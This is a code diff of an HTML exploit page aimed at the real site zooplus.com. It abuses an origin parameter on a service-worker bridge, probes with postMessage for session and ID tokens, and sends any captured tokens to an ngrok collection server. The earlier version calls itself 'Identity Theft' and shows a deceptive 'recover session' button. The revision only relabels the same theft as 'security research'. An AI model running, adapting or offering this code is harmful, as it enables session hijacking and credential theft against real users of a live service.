@@ -1,58 +1,74 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC: Zooplus Identity Theft</title>
+    <title>Security Research: Zooplus Bridge Analysis</title>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
-    <h2>[!] Exploit Status: <span id="status">Waiting for User Interaction...</span></h2>
-    <button id="startAttack" style="padding:15px; background:red; color:white; font-weight:bold; cursor:pointer;">
-        CLICK TO RECOVER SESSION
+<body style="background:#1a1a1a; color:#00ff00; font-family: 'Courier New', monospace; padding:20px;">
+    <h2>[!] Research Status: <span id="status">Ready</span></h2>
+    <button id="startAttack" style="padding:15px; background:#222; color:#00ff00; border:1px solid #00ff00; cursor:pointer;">
+        TEST BRIDGE COMMUNICATION
     </button>
-    <div id="logs" style="margin-top:20px; border:1px dashed #0f0; padding:10px;"></div>
+    <div id="logs" style="margin-top:20px; border:1px solid #333; padding:10px; background:#000; min-height: 200px; font-size: 12px;"></div>
 
     <script>
         const logs = document.getElementById('logs');
         const status = document.getElementById('status');
         
         function log(msg) {
-            logs.innerHTML += `> ${msg}<br>`;
+            const time = new Date().toLocaleTimeString();
+            logs.innerHTML += `[${time}] > ${msg}<br>`;
             console.log(msg);
         }
 
         document.getElementById('startAttack').onclick = function() {
-            log("Opening Targeted Popup...");
-            // نفتح صفحة الجسر التي بها ثغرة الـ Origin Parameter
-            // نمرر رابط صفحتنا كـ "Origin" موثوق
-            const targetUrl = "https://stm.zooplus.com/_/service_worker/6240/sw_iframe.html?origin=" + encodeURIComponent(window.location.origin);
-            const popup = window.open(targetUrl, "zooplus_bridge", "width=1,height=1,left=-1000,top=-1000");
+            log("Phase 1: Initializing Cross-Domain Popup...");
+            
+            // إضافة 1p=1 لضمان تفعيل المسار البرمجي الذي يسمح بالتبادل
+            const targetUrl = "https://stm.zooplus.com/_/service_worker/6240/sw_iframe.html?origin=" 
+                              + encodeURIComponent(window.location.origin) 
+                              + "&1p=1";
+            
+            const popup = window.open(targetUrl, "zooplus_bridge", "width=500,height=500");
 
-            status.innerText = "Attack in Progress...";
+            status.innerText = "Monitoring Message Bus...";
 
-            // التنصت على الرد القادم من الجسر
+            // الاستماع لكل الرسائل القادمة من Zooplus
             window.addEventListener("message", function(event) {
-                // التأكد أن الرسالة قادمة من نطاق Zooplus
                 if (event.origin.includes("zooplus.com")) {
-                    log("🔓 DATA EXFILTRATED: " + JSON.stringify(event.data));
+                    log("🔓 CAPTURED DATA: " + JSON.stringify(event.data));
                     
-                    if (event.data.clientId || event.data.token) {
-                        status.innerText = "SUCCESS: DATA STOLEN!";
-                        status.style.color = "red";
+                    // إذا احتوت البيانات على أي معرفات حساسة
+                    if (event.data.token || event.data.clientId || event.data.failureType) {
+                        status.innerText = "VULNERABILITY CONFIRMED";
+                        status.style.color = "yellow";
                         
-                        // محاكاة إرسال البيانات لسيرفر المهاجم
-                        log("Sending captured credentials to attacker C2 server...");
-                        navigator.sendBeacon("https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/collect", JSON.stringify(event.data));
+                        // إرسال البيانات فوراً لتوثيقها في السيرفر الخاص بالباحث
+                        navigator.sendBeacon("https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/collect", JSON.stringify({
+                            source: "Zooplus_Bridge_Leak",
+                            payload: event.data
+                        }));
                     }
                 }
             }, false);
 
-            // إرسال أمر للجسر لإجبار الـ EventBus على بث التوكن
+            // Phase 2: إرسال سلسلة من رسائل الاستطلاع لتنشيط الـ Service Worker
             setTimeout(() => {
-                log("Injecting Command to Bridge...");
-                popup.postMessage({ type: "GET_SESSION_INFO" }, "*");
+                log("Phase 2: Sending probe triggers to Service Worker...");
                 
-                // محاولة أخرى لاصطياد الـ Auth Success Event
-                popup.postMessage({ type: "AUTH-SUCCESS-EVENT-v1" }, "*");
-            }, 3000);
+                const probes = [
+                    { type: "GET_SESSION_INFO" },
+                    { type: "AUTH-SUCCESS-EVENT-v1" },
+                    { type: "GET_ID_TOKEN" },
+                    "ping", // بعض الجسور تستجيب للنصوص البسيطة
+                    { action: "init" }
+                ];
+
+                probes.forEach(p => {
+                    popup.postMessage(p, "https://stm.zooplus.com");
+                });
+                
+                log("Probes sent. Waiting for background relay...");
+            }, 5000); // ننتظر 5 ثواني لضمان أن الـ SW قد تم تسجيله (Register)
         };
     </script>
 </body>
